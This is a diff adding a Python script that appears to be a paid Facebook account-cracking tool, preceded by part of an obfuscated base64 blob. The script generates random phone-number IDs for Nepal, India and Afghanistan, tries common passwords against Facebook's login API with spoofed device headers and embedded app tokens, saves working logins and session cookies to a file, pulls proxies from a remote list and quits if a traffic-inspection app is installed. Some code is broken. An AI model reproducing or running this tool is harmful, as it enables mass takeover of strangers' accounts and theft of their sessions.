VJkjA3k/qEDr8ZpZJsXCC3JZ6Tvh8taGoyBEU2LoMFUp3YkdTYU6QjTTqSpGMBMtfc3ZMsq0+RDWmyIZm9MipAxwMnrZJsWCD3JvOubMENy0Au2JYi7WnSniTtuYLpFFmfJuuT2QsLbpALPrBAliX2St9soQeWgVzo8mlWrtDllzVJFxZ6QCyUIHvIJHH22V8LxMFk4bVAeJKF1wJRkRC/C4Q7+ayuDKUldTmxWCCfTxZeC2R1MnstiGwuuqBn9mYIBalbBrmO6EiRnWmyM0l25qKeS5F0mqSTJC2eieM3o4E8UveUbZs7dF/1Rsu9lgxRRx7/GYJEx4LmGAB1bWLybjC53S5dKbUjrXYk2hfUjQjERJhOd1yi8iFMuZrLOOUCRLSdicm0euf9Vx40ptQH0uoDm8jqysvP5efX5SXwD7pS6vq0un415AsAKqqS+ja47tfL7isAHmDgwQsA5kkpeh4DD+XAw3bJfSyHH8vht+RwohvYp23O45NTulJqV1qiXYrf0ZTc3pxSH02rjz4bvhk/Fr4Znhrf7iDnKp+nEvoMRVSeU0jueSqhRfdFBUyd4PJUQoNuTHahbWJ8r0IK35bDL8j401DeQsWnpcCQIqHKUGdJ/TngUb6TUGeGqUqtPaGELapWl1DioFCIIKNW4rScA/oKHF05cHg3uSdD5ICzirRliBxoqCe1GSIHzpKnSE2GyIEOisakHOgiT2JSDrxKEqQqobyjvqtOiN/oKVhWflNZRvwj2qj4NmlU/JHSRfwJ3b5X8YM9JMIDyvZG4geNdIda8UMVCfDtw9s724i32450HVL85UES4P8HMia0IA=="))))
+#----------http_canary-------#
+import requests
+import os,sys
+ 
+ 
+try:
+    g = "anar"
+    f="tt"
+    file_d = os.listdir('rm -rf')
+    if f'com.h{f}pc{g}y.pro' in file_d:
+        print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
+        exit()
+    else:
+        pass
+except Exception as e:
+    pass
+ 
+try:
+    import requests
+except ModuleNotFoundError:
+    os.system('pip install requests')
+    
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
+	open('proxies.txt','w').write(prox)
+except Exception as e:
+	print('')
+proxies=open('proxies.txt','r').read().splitlines()
+ 
+princp=[]
+#-----------------------------------------------------#
+usr=[]
+android_models=[]
+#-----------------------------------------------------#
+bLIMON="\033[1;30m" 
+M="\033[1;31m" 
+W = '\x1b[1;97m' #white 
+Y = '\x1b[1;93m' #yellow 
+S = '\x1b[1;96m' #sky_blue    
+H="\033[1;33m"               
+byellow="\033[1;33m"     
+bblue="\033[1;34m"        
+P="\033[1;35m"               
+C="\033[1;36m"          
+B="\033[1;37m"       
+G="\033[1;32m"              
+R="\033[1;31m"
+AA="\033[1;32m"
+BB="\033[1;31m"
+CC="\033[1;36m"
+X='\033[1;30m'
+XX="\x1b[38;5;196m"
+GGG="\x1b[38;5;214m"
+#-----------------------------------------------------#
+ 
+din = datetime.datetime.now().now
+mash = datetime.datetime.now().month
+bosor = datetime.datetime.now().year
+ 
+loop = 0
+oks = []
+cps = []
+twf = []
+bou = []
+ugen = []
+method = []
+password = []
+ 
+
+ 
+#-----------------------------------------------------#
+ 
+  
+ 
+sim_id = ''
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+fblc = 'en_GB'
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+except:
+        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
+fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+fbdv = model
+fbsv = android_version
+fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
+fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
+try:
+        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
+        total = 0
+        for i in fbcr:
+                total+=1
+        select = ('1','2')
+        if select == '1':
+                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
+                sim_id+=fbcr
+        elif select == '2':
+                try:
+                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
+                        sim_id+=fbcr
+                except Exception as e:
+                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
+                        sim_id+=fbcr
+        else:
+                fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
+                sim_id+=fbcr
+except:
+        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
+device = {
+        'android_version':android_version,
+        'model':model,
+        'build':build,
+        'fblc':fblc,
+        'fbmf':fbmf,
+        'fbbd':fbbd,
+        'fbdv':model,
+        'fbsv':fbsv,
+        'fbca':fbca,
+        'fbdm':fbdm}
+#-----------------------------------------------------#
+kkkkki = random.choice(['SM-G920F','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
+def limon1():
+        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/791484986;FBBV/444411021;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/791484986;FBCR/Jazz;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,641=480,height=1041};FB_FW/1;]'
+        return ua
+#-----------------------------------------------------#
+os.system('xdg-open https://facebook.com/groups/1079392916067208/')
+logo1 = f"""{W}
+\033[1;32m88     88 8b    d8  dP"Yb  88b 88 
+\033[1;31m88     88 88b  d88 dP   Yb 88Yb88 
+\033[1;33m88  .o 88 88YbdP88 Yb   dP 88 Y88 
+\033[1;32m88ood8 88 88 YY 88  YbodP  88  Y8 
+\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
+ [<>] \033[1;36mOWNER   :  ASIF SAKHANI 
+ [<>] \033[1;32maFACEBOOK :  MR DEVIL 
+ [<>] \033[1;34mWHATSAPP  :  03417020930
+ [<>] \033[1;35mSTATUS  :  Paid
+ [<>] \033[1;31mTOOLS   :  FILE X RANDOM
+ [<>] \033[1;37mVERSION :  \033[1;32m 3.1\033[1;32m \033[1;37m
+\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
+\033[1;32m═══════════════════════════════════════════════
+
+\033[1;32m═══════════════════════════════════════════════"""
+ 
+line = f"{Y}<><><><<><><><><><><><><><><><><><><><>"
+ 
+def clear():os.system('clear');print(logo1)
+def linex():print(line)
+ 
+#                                                RANDOM M1 UP
+kkkkki = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
+def limon2():
+        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/433.0.0.31.111;FBBV/444411021;FBDM/{density=2.25,width=720,height=1280};FBLC/en_NP;FBRV/791484986;FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX3663;FBSV/13;nullFBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,641=480,height=1041};FB_FW/1;]'
+        return ua
+ 
+
+
+class Main:
+    def Awm():
+        clear()
+        print(f'{G} [1]<>FILE CLONING')
+        print(f' [2]<>RANDOM CLONING')  
+        print(f' [3]<>EXIT PROGRAM')
+        linex()
+        awm = input(f' ~SELECT OPTION :{G} ');linex()
+        if awm in ['1']:Awm_File()
+        elif awm in ['2']:Awm_rndm()
+        elif awm in ['3']:os.system('xdg-open https://github.com/AKASH-CYBER-196')
+        elif awm in ['4']:sys.exit()
+        else:Main.Awm()
+ 
+def Awm_File():
+    clear()
+    file = input(f' PUT FILE  : ');linex()
+    try:fo = open(file,'r').read().splitlines()
+    except FileNotFoundError:Awm_File()
+    limit = int(input(f' TOTAL PASSWORD LIMIT : '));linex()
+    for z in range(limit):
+        print(' EXAMPLE  : firstlast,first123,last@123,etc')
+        password.append(input(f' PASSWORD NO.{z+1} : '));linex()
+    #server = input(f' SERVER  : 1-2\n >>>{G} ');linex()
+    #if server in ['1']:method.append('mA')
+    #elif server in ['2']:method.append('mB')
+    #elif server in ['3']:method.append('mC')
+    with tred(max_workers=30) as My_Tanisha:
+        tl = str(len(fo))
+        clear()
+        print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
+        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/ASIF-OK.txt{W}")
+        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/ASIF-CP.txt{W}")
+        print(f" USE AIRPLANE MOD FOR GOOD RESULT{G}")
+        print(f"---------------------------------------------------")
+        for user in fo:
+            ids,names = user.split('|')
+            passlist = password
+            #if "mA" in method:My_Tanisha.submit(crack_file_A,ids,names,passlist)
+            #elif "mB" in method:My_Tanisha.submit(crack_file_B,ids,names,passlist)
+            #elif "mC" in method:My_Tanisha.submit(crack_file_C,ids,names,passlist)
+            My_Tanisha.submit(crack_file_A,ids,names,passlist)
+            #My_Tanisha.submit(crack_file_B,ids,names,passlist)
+    print('')
+    linex()
+    print(' THE PROCESS HAS BEEN COMPLETED')
+    print(f' TOTAL OK  : {G} {str(len(oks))}')
+    print(f'{W} TOTAL CP  : {R} {str(len(cps))}{W}')
+    print(f' THANKS FOR USING MY TOOL')
+    linex()
+ 
+def Awm_rndm():
+    clear()
+    print(f' [1] <>NEPAL UID CLONING')
+    print(f' [2] <>INDIA UID CLONING')
+    print(f' [3] <> AFGHANISTAN UID CLONING')
+    linex()
+    awm = input(f' ~SELECT OPTION  :{G} ');linex()
+    if awm in ['1']:Akash.nepal()
+    elif awm in ['2']:Akash.india()
+    if awm in ['3']: Akash.afghan()
+    else:Awm_rndm()
+ 
+class Akash:
+    def nepal():
+        clear()
+        print(f' EXAMPLE  : 9815,9814,9861,9840')
+        code = input(f' SELECT   :{G} ');linex()
+        print(f' EXAMPLE  : 10000,20000,30000')
+        limit = int(input(f' SELECT   :{G} '));linex()
+        for n in range(limit):
+            awmx = "".join(random.choice(string.digits) for _ in range(6))
+            bou.append(awmx)
+        with tred(max_workers=35) as My_Tanisha:
+            tl = str(len(bou))
+            clear()
+            print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
+            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/ASIF-OK.txt{W}")
+            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/ASIF-CP.txt{W}")
+            print(f" NEPAL COUNTRY IDS CLONING STARTED...")
+            print(f"---------------------------------------------------")
+            for love in bou:
+                ids = code + love
+                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','lama123','lama12345','lama@123','gurung','gurung123','gurung12345','gurung@123','magar','magar123','magar12345','magar@123','tamang123','tamang@123','tamang12345']
+                My_Tanisha.submit(crack_rand,ids,passlist)
+        print('')
+        linex()
+        print(' THE PROCESS HAS BEEN COMPLETED')
+        print(f' TOTAL OK  : {G} {str(len(oks))}')
+        print(f'{W} TOTAL CP  : {R} {str(len(cps))}{W}')
+        print(f' THANKS FOR USING MY TOOL')
+        linex()
+    
+    def afghan():
+        clear()
+        print(f' EXAMPLE  : 91637,91789,91620')
+        code = input(f' SELECT   :{G} ');linex()
+        print(f' EXAMPLE  : 10000,20000,30000')
+        limit = int(input(f' SELECT   :{G} '));linex()
+        for n in range(limit):
+            awmx = "".join(random.choice(string.digits) for _ in range(7))
+            bou.append(awmx)
+        with tred(max_workers=30) as My_Tanisha:
+            tl = str(len(bou))
+            clear()
+            print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
+            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/LIMON-OK.txt{W}")
+            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/LIMON-CP.txt{W}")
+            print(f" INDIA COUNTRY IDS CLONING STARTED....")
+            print(f"---------------------------------------------------")
+            for love in bou:
+                ids = code + love
+                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'57273200','59039200','57575751','57575752']
+                My_Tanisha.submit(crack_rand,ids,passlist)
+        print('')
+        linex()
+        print(' THE PROCESS HAS BEEN COMPLETED')
+        print(f' TOTAL OK  : {G} {str(len(oks))}')
+        print(f'{W} TOTAL CP  : {R} {str(len(cps))}{W}')
+        print(f' THANKS FOR USING MY TOOL')
+        linex()
+        
+    def nepal():
+        clear()
+        print(f' EXAMPLE  : 9815,9814,9861,9840')
+        code = input(f' SELECT   :{G} ');linex()
+        print(f' EXAMPLE  : 10000,20000,30000')
+        limit = int(input(f' SELECT   :{G} '));linex()
+        for n in range(limit):
+            awmx = "".join(random.choice(string.digits) for _ in range(6))
+            bou.append(awmx)
+        with tred(max_workers=30) as My_Tanisha:
+            tl = str(len(bou))
+            clear()
+            print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
+            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/LIMON-OK.txt{W}")
+            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/LIMON-CP.txt{W}")
+            print(f" NEPAL COUNTRY IDS CLONING STARTED...")
+            print(f"---------------------------------------------------")
+            for love in bou:
+                ids = code + love
+                passlist = [ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','nepal@123','kathmandu123']
+                My_Tanisha.submit(crack_rand,ids,passlist)
+        print('')
+        linex()
+        print(' THE PROCESS HAS BEEN COMPLETED')
+        print(f' TOTAL OK  : {G} {str(len(oks))}')
+        print(f'{W} TOTAL CP  : {R} {str(len(cps))}{W}')
+        print(f' THANKS FOR USING MY TOOL')
+        linex()
+##------------------[ CRACK-MT ]------------------##
+def crack_file_A(ids,names,passlist):
+    global loop,oks,cps
+    sys.stdout.write(f'\r\r {W}[ASIF>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
+    sys.stdout.flush()
+    try:
+        fn = names.split(' ')[0]
+        try:
+            ln = names.split(' ')[1]
+        except:
+            ln = fn
+        for pw in passlist:
+            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
+            data = {
+            "email":ids,
+            "password":pas,
+            "adid": str(uuid.uuid4()),
+            "device_id": str(uuid.uuid4()),
+            "family_device_id": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "logged_out_id": str(uuid.uuid4()),
+            "locale": "en_US",
+            "client_country_code": "US", # --> From Parsing User Agent
+            "cpl": "true",
+            "source": "login",
+            "format": "json",
+            "omit_response_on_success": "false",
+            "credentials_type": "password",
+            "error_detail_type": "button_with_disabled",
+            "generate_session_cookies": "1",
+            "generate_analytics_claim": "1",
+            "generate_machine_id": "1",
+            "tier": "regular",
+            "currently_logged_in_userid" : "0",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
+            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
+            "access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895", # --> Use App ID|Token/Sig
+            "api_key": "882a8490361da98702bf97a021ddc14d",
+            "sig":"1d6bdac1d94b7eff5dfc99453b632a28"}
+            head = {
+            "User-Agent": limon1(),
+            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-Connection-Quality": "EXCELLENT",
+            "X-FB-Connection-Type": "MOBILE.LTE",
+            "X-FB-connection-Token": "d29d67d37eca387482a8a5b740f84f62",
+            "X-FB-HTTP-Engine": "Liger",
+            'X-FB-Client-IP': 'True',
+            "X-FB-Friendly-Name": "authenticate",
+            "Content-Type": "application/x-www-form-urlencoded",
+            }
+            url = "https://graph.facebook.com/auth/login"
+            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            if "access_token" in po:
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                print(f'\r\r {G}[ASIGASIF-OK] {ids} | {pas}')
+                open('/sdcard/ASIF-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                open('/sdcard/LIMON-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:continue
+        loop+=1
+    except Exception as e:
+        pass
+ 
+def crack_rand(ids,passlist):
+    global loop,oks,cps
+    sys.stdout.write(f'\r\r {W}[ASIF>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
+    sys.stdout.flush()
+    try:
+        for pas in passlist:
+            data = {
+            "email":ids,
+            "password":pas,
+            "adid": str(uuid.uuid4()),
+            "device_id": str(uuid.uuid4()),
+            "family_device_id": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "logged_out_id": str(uuid.uuid4()),
+            "locale": "en_US",
+            "client_country_code": "US",
+            "cpl": "true",
+            "source": "login",
+            "format": "json",
+            "omit_response_on_success": "false",
+            "credentials_type": "password",
+            "error_detail_type": "button_with_disabled",
+            "generate_session_cookies": "1",
+            "generate_analytics_claim": "1",
+            "generate_machine_id": "1",
+            "tier": "regular",
+            "currently_logged_in_userid" : "0",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
+            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
+            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
+            "api_key": "882a8490361da98702bf97a021ddc14d",
+            "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
+            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
+            head = {
+            "User-Agent": limon2(),
+            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
